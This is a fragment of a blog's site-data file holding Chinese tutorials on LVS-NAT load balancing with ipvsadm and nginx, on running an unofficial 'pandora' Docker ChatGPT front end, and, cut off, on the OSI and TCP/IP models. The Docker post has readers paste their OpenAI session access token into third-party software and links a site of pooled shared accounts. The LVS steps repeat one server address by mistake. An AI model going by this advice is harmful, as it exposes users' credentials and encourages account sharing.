}\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"准备条件\"><a href=\"#准备条件\" class=\"headerlink\" title=\"准备条件\"></a>准备条件</h3><p>需要最少准备三台虚拟机，关闭selinx和防火墙。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n<th align=\"center\">网关</th>\n<th align=\"center\">软件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens160</td>\n<td align=\"center\">nat</td>\n<td align=\"center\">192.168.20.40&#x2F;24</td>\n<td align=\"center\">192.168.20.254</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">DS</td>\n<td align=\"center\">调度服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">-</td>\n<td align=\"center\">ipvsadm</td>\n</tr>\n<tr>\n<td align=\"center\">web1</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.20&#x2F;24</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n<tr>\n<td align=\"center\">web2</td>\n<td align=\"center\">真实服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">172.21.8.30&#x2F;24</td>\n<td align=\"center\">172.21.8.10&#x2F;24</td>\n<td align=\"center\">nginx</td>\n</tr>\n</tbody></table>\n<p>PS:</p>\n<ol>\n<li>DS一定是两块网卡，并且用一张网卡去作为真实服务器的网关。</li>\n<li>DS的两块网卡最好模式是不一样的。</li>\n</ol>","more":"<h3 id=\"DS的配置\"><a href=\"#DS的配置\" class=\"headerlink\" title=\"DS的配置\"></a>DS的配置</h3><p>下载ipvsadm</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y ipvsadm</span><br></pre></td></tr></table></figure>\n\n<p>添加一个虚拟服务指定运输层协议为TCP、VIP为192.168.20.40、端口为80、调度算法为加权轮训。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -A -t 192.168.20.40:80 -s rr</span><br></pre></td></tr></table></figure>\n\n<p>为虚拟服务器添加后端真实服务器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -a -t 192.168.20.40:80 -r 172.21.8.20:80 -m</span><br></pre></td></tr></table></figure>\n\n<p>使用命令查看生成的策略</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -Ln</span><br></pre></td></tr></table></figure>\n\n<p>开启路由转发功能</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>\n\n<p>使用命令修改轮训的时间</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm --<span class=\"built_in\">set</span> 1 1 1</span><br></pre></td></tr></table></figure>\n\n<p>使用命令查看超时时间设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipvsadm -L --<span class=\"built_in\">timeout</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"WEB1配置\"><a href=\"#WEB1配置\" class=\"headerlink\" title=\"WEB1配置\"></a>WEB1配置</h3><p>下载Nginx</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y nginx</span><br></pre></td></tr></table></figure>\n\n<p>nginx的配置文件保存在<code>/etc/nginx/nginx.conf</code></p>\n<p>使用命令去掉Nginx配置文件的空行和注释行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改配置文件</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">worker_processes  1;</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  172.21.8.20;    <span class=\"comment\"># 本机IP</span></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   /web;    <span class=\"comment\"># 根目录地址</span></span><br><span class=\"line\">            index  index.html index.htm;    <span class=\"comment\"># 要去寻找的文件</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建HTML资源文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /web</span><br></pre></td></tr></table></figure>\n\n<p>编辑网页入口文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">touch</span> /web/index.html</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;web1111&quot;</span> &gt; /web/index.html</span><br></pre></td></tr></table></figure>\n\n<p>开启Nginx服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<p>验证服务开启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"WEB2配置\"><a href=\"#WEB2配置\" class=\"headerlink\" title=\"WEB2配置\"></a>WEB2配置</h3><p>web2配置基本同web1。</p>\n<p>使用命令去掉Nginx配置文件的空行和注释行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">egrep -v <span class=\"string\">&quot;^[[:space:]]*#|^$&quot;</span> nginx.conf.default &gt; nginx.conf</span><br></pre></td></tr></table></figure>\n\n<p>修改配置文件</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">worker_processes  1;</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  172.21.8.30;</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   /web;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>创建HTML资源文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> /web</span><br></pre></td></tr></table></figure>\n\n<p>编辑网页入口文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">touch</span> /web/index.html</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;web2222&quot;</span> &gt; /web/index.html</span><br></pre></td></tr></table></figure>\n\n<p>开启Nginx服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<p>验证服务开启</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p>先在web1主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 172.21.8.20</span><br></pre></td></tr></table></figure>\n\n<p>然后在web2主机</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 172.21.8.30</span><br></pre></td></tr></table></figure>\n\n<p>最后在DS主机上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.20.40</span><br></pre></td></tr></table></figure>\n\n<p>如果观察到<code>web1111</code>和<code>web2222</code>来回显示在页面上则配置成功。</p>\n<h3 id=\"其他可能用到的命令\"><a href=\"#其他可能用到的命令\" class=\"headerlink\" title=\"其他可能用到的命令\"></a>其他可能用到的命令</h3><p>Linux查看路由表</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip r s</span><br></pre></td></tr></table></figure>\n\n<p>重启Nginx的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n\n<p>关闭Nginx的命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s stop</span><br></pre></td></tr></table></figure>"},{"title":"利用docker搭建本地的chatGPT（已失效）","date":"2023-09-12T07:43:04.000Z","_content":"\n### 写在前面的话\n\n由于docker镜像不再维护，项目被作者转移为另一个项目，所以本教程已过期，最新的教程可以看[**在 VPS 上搭建自己的 chatGPT**]()。\n\n在偶然的机会看到一个不错的项目，可以利用docker搭建一个能在本地跑的chatGPT，速度出奇地快，而且和真实chatGPT的数据是一模一样的，实测很nice，可以搞。\n\n<!-- more -->\n\n### 搭建步骤\n\n1. 自行解决docker环境。\n\n2. 拉取镜像。\n\n```bash\ndocker pull pengzhile/pandora\n```\n\n3. 运行容器。\n\n```bash\ndocker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora\n```\n\n4. 运行成功就可以在浏览器输入`127.0.0.1:8899`进行访问了。输入自己的chatGPT的账号，就可以正常登录，或者可以通过`token`的方式进行登录。\n\n获取`token`的方法：   \n1. 正常登入到chatGPT的页面。\n2. 点击获取`token`的链接，[**链接在此**](http://chat.openai.com/api/auth/session)\n3. 随后就会出现如下这样的json串，只需要截取箭头位置（括号里）的`token`值即可。\n\n![token](./LocalchatGPT/1.png)\n\n4. 在登录时，选择下方的accesstoken进行登录，然后把token值粘贴进文本框确认即可。\n\n![success](./LocalchatGPT/2.png)\n\n5. 最终的效果图，左边是docker环境下的chatGPT，右边是OpenAI的chatGPT。\n\n![success](./LocalchatGPT/3.png)\n\n---\n\n除此以外，pandora 的作者还搭建了共享的 chatGPT，都是由网友提供的共享的 chatGPT 的账号组成。\n\n怀着敬意地低调使用吧，[**共享的 chatGPT 点击跳转**](https://chat-shared2.zhile.io/shared.html?v=2)","source":"_posts/LocalchatGPT.md","raw":"---\ntitle: 利用docker搭建本地的chatGPT（已失效）\ndate: 2023-09-12 15:43:04\ncategories: 小玩意儿\ntags:\n  - AI\n---\n\n### 写在前面的话\n\n由于docker镜像不再维护，项目被作者转移为另一个项目，所以本教程已过期，最新的教程可以看[**在 VPS 上搭建自己的 chatGPT**]()。\n\n在偶然的机会看到一个不错的项目，可以利用docker搭建一个能在本地跑的chatGPT，速度出奇地快，而且和真实chatGPT的数据是一模一样的，实测很nice，可以搞。\n\n<!-- more -->\n\n### 搭建步骤\n\n1. 自行解决docker环境。\n\n2. 拉取镜像。\n\n```bash\ndocker pull pengzhile/pandora\n```\n\n3. 运行容器。\n\n```bash\ndocker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora\n```\n\n4. 运行成功就可以在浏览器输入`127.0.0.1:8899`进行访问了。输入自己的chatGPT的账号，就可以正常登录，或者可以通过`token`的方式进行登录。\n\n获取`token`的方法：   \n1. 正常登入到chatGPT的页面。\n2. 点击获取`token`的链接，[**链接在此**](http://chat.openai.com/api/auth/session)\n3. 随后就会出现如下这样的json串，只需要截取箭头位置（括号里）的`token`值即可。\n\n![token](./LocalchatGPT/1.png)\n\n4. 在登录时，选择下方的accesstoken进行登录，然后把token值粘贴进文本框确认即可。\n\n![success](./LocalchatGPT/2.png)\n\n5. 最终的效果图，左边是docker环境下的chatGPT，右边是OpenAI的chatGPT。\n\n![success](./LocalchatGPT/3.png)\n\n---\n\n除此以外，pandora 的作者还搭建了共享的 chatGPT，都是由网友提供的共享的 chatGPT 的账号组成。\n\n怀着敬意地低调使用吧，[**共享的 chatGPT 点击跳转**](https://chat-shared2.zhile.io/shared.html?v=2)","slug":"LocalchatGPT","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ea00307zj3cyh3hbmr","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"写在前面的话\"><a href=\"#写在前面的话\" class=\"headerlink\" title=\"写在前面的话\"></a>写在前面的话</h3><p>由于docker镜像不再维护，项目被作者转移为另一个项目，所以本教程已过期，最新的教程可以看<a href><strong>在 VPS 上搭建自己的 chatGPT</strong></a>。</p>\n<p>在偶然的机会看到一个不错的项目，可以利用docker搭建一个能在本地跑的chatGPT，速度出奇地快，而且和真实chatGPT的数据是一模一样的，实测很nice，可以搞。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h3><ol>\n<li><p>自行解决docker环境。</p>\n</li>\n<li><p>拉取镜像。</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull pengzhile/pandora</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>运行容器。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>运行成功就可以在浏览器输入<code>127.0.0.1:8899</code>进行访问了。输入自己的chatGPT的账号，就可以正常登录，或者可以通过<code>token</code>的方式进行登录。</li>\n</ol>\n<p>获取<code>token</code>的方法：   </p>\n<ol>\n<li>正常登入到chatGPT的页面。</li>\n<li>点击获取<code>token</code>的链接，<a href=\"http://chat.openai.com/api/auth/session\"><strong>链接在此</strong></a></li>\n<li>随后就会出现如下这样的json串，只需要截取箭头位置（括号里）的<code>token</code>值即可。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/1.png\" alt=\"token\"></p>\n<ol start=\"4\">\n<li>在登录时，选择下方的accesstoken进行登录，然后把token值粘贴进文本框确认即可。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/2.png\" alt=\"success\"></p>\n<ol start=\"5\">\n<li>最终的效果图，左边是docker环境下的chatGPT，右边是OpenAI的chatGPT。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/3.png\" alt=\"success\"></p>\n<hr>\n<p>除此以外，pandora 的作者还搭建了共享的 chatGPT，都是由网友提供的共享的 chatGPT 的账号组成。</p>\n<p>怀着敬意地低调使用吧，<a href=\"https://chat-shared2.zhile.io/shared.html?v=2\"><strong>共享的 chatGPT 点击跳转</strong></a></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"写在前面的话\"><a href=\"#写在前面的话\" class=\"headerlink\" title=\"写在前面的话\"></a>写在前面的话</h3><p>由于docker镜像不再维护，项目被作者转移为另一个项目，所以本教程已过期，最新的教程可以看<a href><strong>在 VPS 上搭建自己的 chatGPT</strong></a>。</p>\n<p>在偶然的机会看到一个不错的项目，可以利用docker搭建一个能在本地跑的chatGPT，速度出奇地快，而且和真实chatGPT的数据是一模一样的，实测很nice，可以搞。</p>","more":"<h3 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h3><ol>\n<li><p>自行解决docker环境。</p>\n</li>\n<li><p>拉取镜像。</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull pengzhile/pandora</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>运行容器。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run  -e PANDORA_CLOUD=cloud -e PANDORA_SERVER=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>运行成功就可以在浏览器输入<code>127.0.0.1:8899</code>进行访问了。输入自己的chatGPT的账号，就可以正常登录，或者可以通过<code>token</code>的方式进行登录。</li>\n</ol>\n<p>获取<code>token</code>的方法：   </p>\n<ol>\n<li>正常登入到chatGPT的页面。</li>\n<li>点击获取<code>token</code>的链接，<a href=\"http://chat.openai.com/api/auth/session\"><strong>链接在此</strong></a></li>\n<li>随后就会出现如下这样的json串，只需要截取箭头位置（括号里）的<code>token</code>值即可。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/1.png\" alt=\"token\"></p>\n<ol start=\"4\">\n<li>在登录时，选择下方的accesstoken进行登录，然后把token值粘贴进文本框确认即可。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/2.png\" alt=\"success\"></p>\n<ol start=\"5\">\n<li>最终的效果图，左边是docker环境下的chatGPT，右边是OpenAI的chatGPT。</li>\n</ol>\n<p><img src=\"/2023/09/12/LocalchatGPT/3.png\" alt=\"success\"></p>\n<hr>\n<p>除此以外，pandora 的作者还搭建了共享的 chatGPT，都是由网友提供的共享的 chatGPT 的账号组成。</p>\n<p>怀着敬意地低调使用吧，<a href=\"https://chat-shared2.zhile.io/shared.html?v=2\"><strong>共享的 chatGPT 点击跳转</strong></a></p>"},{"title":"OSI模型与TCP/IP模型","date":"2024-04-10T02:45:28.000Z","_content":"\n### OSI七层模型\n\nOSI七层模型分别是：应用层、表示层、会话层、 运输层、网络层、数据链路层、物理层。\n\n> 有的将运输层讲为传输层，其实大家表达的意思都一样。\n\n<!-- more -->\n\n#### 应用层\n\n应用层是直接面向用户的，提供UI页面的。\n\n#### 表示层\n\n表示层负责数据的加密与解密，数据的格式转换、数据的压缩与解压。\n\n#### 会话层\n\n会话层负责管理会话。建立连接，维护连接，控制连接的建立与终止。包括何时开始会话，何时交换数据，数据发送方式（轮流发送、同时发送）、会话中断如何恢复、会话如何结束。\n\n#### 运输层\n\n段是运输层的数据传输单位，运输层是在为正在通讯的两台主机的应用进程服务的，并且提供的是可靠的数据传输服务。特别留意运输层是**端到端的通讯方式**，运输层的功能可以概括为“三控制一寻址”：\n\n- 差错控制：检测传输过程中数据的错误，并纠正错误。\n- 流量控制：为了防止发送方将数据过快的发送，而接收方不能及时接收，从而导致数据丢失的现象。\n- 连接控制：为了提供可靠的**端到端**通信，在传输数据时建立连接，在数据传输完毕关闭连接。\n- 应用进程寻址：一台主机上可能会有多个应用进程，运输层要通过某种编址方法，能区分每个应用进程，将数据传输给正确的应用进程。\n\n#### 网络层\n\n网络层的基本传输单位是分组。在数据的发送方和接收方有可能隔着很多不同的网络，而网络层的主要的任务是为分组择路，选择一条合适的路径，使数据能够从发送方到达接收方。特别留意运输层是**点到点的通讯方式**。\n\n#### 数据链路层\n\n数据链路层的基本传输单位是帧。数据链路层是网络层和物理层的桥梁，在同一物理网络中，两个节点（主机与交换机）之间传输帧，数据链路层也涉及到一个寻址的问题，而在数据链路层是通过MAC地址的方式进行寻址的。数据链路层也有流量控制、差错控制、访问控制的功能。\n\n#### 物理层\n\n物理层的基本传输单位是比特。物理层更贴近硬件，比如网线。物理层的主要任务是将0,1比特流从物理链路的一端发送到另一端。\n\n### 图片对比\n\n![图片对比](./OSI-TCP-IP-model/1.png)\n\n### TCP/IP模型\n\nTCP/IP模型是OSI模型之后新提出的模型，一共四层：应用层、运输层、互联网层、网络接口层。\n\n#### 应用层\n\nTCP/IP模型与OSI模型的应用层功能基本一致，囊括应用层的应用协议，如HTTP、FTP、SMTP、POP3等。TCP/IP模型没有包含OSI中的表示层和会话层，在实际的联网实践中证明这两个层对于多数的应用程序没有多大的用处。\n\n#### 运输层\n\nTCP/IP模型的运输层也同样提供的是**端到端**的通讯。在TCP/IP的体系中，运输层提供两个非常重要的协议，分别是TCP和UDP。\n\n- TCP：TCP是面向连接的，TCP协议在传输数据之前，会先建立连接，然后才能传输数据；在传输数据时，会进行差错控制，保证数据的可靠性，同时会进行流量控制，保证数据的传输速度。\n- UDP：UDP是面向无连接的，UDP协议不能保证数据的可靠性，但是UDP协议效率比较高，传输的速度比较快，适合对数据安全性不高对速度高的服务，比如音频和视频。\n\n#### 